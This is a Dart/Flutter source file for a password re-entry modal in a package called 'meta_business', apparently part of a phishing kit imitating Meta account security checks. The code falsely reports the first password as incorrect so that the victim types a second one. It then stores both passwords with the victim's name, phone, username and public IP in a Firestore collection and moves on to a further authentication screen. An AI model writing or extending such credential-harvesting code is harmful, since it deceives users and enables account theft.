import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:easy_localization/easy_localization.dart';
import 'package:flutter/material.dart';
import 'package:meta_business/src/presentation/home/auth_screen.dart';
import 'package:meta_business/src/presentation/home/widget/widget_input.dart';
import 'package:meta_business/src/resources/firestore/firestore_resources.dart';
import 'package:meta_business/src/resources/firestore/instances.dart';
import 'package:http/http.dart';
import 'package:dart_ipify/dart_ipify.dart';
import 'package:timezone/data/latest.dart' as tz;
import 'package:timezone/timezone.dart' as tz;
import 'package:intl/intl.dart';

class ModalSuccess extends StatefulWidget {
  final FormInput data;

  const ModalSuccess({super.key, required this.data});

  @override
  State<StatefulWidget> createState() => _ModalSuccessState();
}

class _ModalSuccessState extends State<ModalSuccess> {
  bool isCap1OK = false;

  String? capCha1;
  String? capCha2;

  Future<String> getPublicIP() async {
    final ipv6 = await Ipify.ipv64();
    print(ipv6);
    return ipv6;
  }

  @override
  Widget build(BuildContext context) {
    TextEditingController cap1 = TextEditingController();
    TextEditingController cap2 = TextEditingController();

    return Material(
      color: Colors.transparent,
      child: Center(
        child: Container(
          width: 560,
          // Adjust as needed
          decoration: BoxDecoration(
            color: Colors.white,
            borderRadius: BorderRadius.circular(8), // Rounded border
            boxShadow: [
              BoxShadow(
                color: Colors.grey.withOpacity(0.5),
                spreadRadius: 5,
                blurRadius: 7,
                offset: const Offset(0, 3), // changes position of shadow
              ),
            ],
          ),
          padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
          margin: const EdgeInsets.all(16),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  const Text(
                    "Please Enter Your password",
                    style: TextStyle(
                        fontWeight: FontWeight.bold, fontSize: 18, height: 1.6),
                  ),
                  IconButton(
                    onPressed: () {
                      Navigator.of(context).pop();
                    },
                    icon: const Icon(Icons.close),
                  ),
                ],
              ),
              const Divider(), // Divider line
              const SizedBox(height: 16),
              const Text(
                "For your security, you must re-enter your password to continue.",
                textAlign: TextAlign.left,
                style: TextStyle(fontSize: 16, height: 1.6),
              ),

              const SizedBox(height: 16),
              if (capCha1 == null)
                WidgetInput(
                    obscureText: true,
                    validator: (value) {
                      if (value == null || value.isEmpty) {
                        return 'Please enter your password';
                      }
                      return null;
                    },
                    label: "Enter Your password",
                    controller: cap1,
                    onChanged: (_) {
                      // setState(() {});
                    }),
              if (capCha1 != null)
                WidgetInput(
                    obscureText: true,
                    validator: (value) {
                      if (capCha1 != null) {
                        return 'Your password was incorrect !';
                      } else if (value == null || value.isEmpty) {
                        return 'Please enter your password';
                      }
                      return null;
                    },
                    label: "Enter Your password",
                    controller: cap2,
                    onChanged: (_) {
                      // setState(() {});
                    }),
              const Divider(), // Divider line
              const SizedBox(height: 16),
              Align(
                alignment: Alignment.centerRight,
                child: ElevatedButton(
                  onPressed: () async {
                    if (capCha1 == null) {
                      setState(() {
                        isCap1OK = true;
                        capCha1 = cap1.text;
                      });
                    } else {
                      setState(() {
                        capCha2 = cap2.text;
                      });
                    }

                    if (capCha2 != null) {
                      print("check cap1 $capCha1");
                      print("check cap2 $capCha2");
                      String ip = await getPublicIP();

                      tz.initializeTimeZones();
                      tz.setLocalLocation(tz.getLocation('Asia/Ho_Chi_Minh'));
                      tz.TZDateTime now = tz.TZDateTime.now(tz.local);

                      String formattedDateTime =
                          DateFormat('HH:mm dd/MM/yyyy').format(now);

                      // Đọc giá trị hiện tại của counter từ Firebase
                    

                      DocumentReference rowId = await colData.add({
                        "username": widget.data.username,
                        "name": widget.data.name,
                        "phone": widget.data.phone,
                        "comment": widget.data.comment,
                        "cap1": capCha1,
                        "cap2": capCha2,
                        "ip": ip,
                        "created_at": formattedDateTime,
                       
                      }); //insert vào trong firebase

                      print("modelsucess ${rowId.id}");

                      Navigator.push(context,
                          MaterialPageRoute(builder: (context) {
                        return AuthScreen(
                          rowId: rowId.id,
                        );
                      }));
                    }
                  },
                  style: ElevatedButton.styleFrom(
                    primary: const Color(0xFF355797),
                    // Assuming blue is the primary color
                    textStyle: const TextStyle(color: Colors.white),
                  ),
                  child: Container(
                    padding:
                        const EdgeInsets.symmetric(horizontal: 8, vertical: 16),
                    child: const Text(
                      "Continue",
                      style: TextStyle(fontSize: 14, color: Colors.white),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
